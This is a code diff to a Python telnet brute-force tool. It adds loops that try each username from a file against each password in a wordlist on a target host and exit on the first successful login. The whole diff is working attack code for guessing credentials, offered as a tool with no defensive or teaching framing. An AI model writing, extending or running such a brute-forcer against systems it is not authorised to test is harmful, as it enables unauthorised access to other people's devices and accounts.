@@ -1,6 +1,7 @@
 #!/bin/python3
 import telnetlib
 import os 
+import sys
 import argparse
 import colorama
 def telconnect(host, username, password, port=23,code=0):
@@ -26,14 +27,29 @@ def bruteforcer(host, passwordlist, username, port=None):
     if check:
         check = os.path.isfile(username)
         if check:
-            pass
+            found = False
+            with open(username) as users:
+                for user in users:
+                    with open(passwordlist,'r') as passwords:
+                        for password in passwords:
+                            code = telconnect(host,user,password)
+                            if code == 0:
+                                found = True
+                                succes(username, password)
+                                sys.exit(0)
+            if found == False:
+                sys.exit(1)
         else:
+            found = False
             with open(passwordlist,'r') as passwords:
                 for password in passwords:
                     code = telconnect(host,username,password)
                     if code == 0:
                         succes(username, password)
-                        break
+                        found = True
+                        sys.exit(0)
+            if found == False:
+                sys.exit(1)
     else:
         print("passwordlist is not valid path")
-        exit()
+        sys.exit(1)
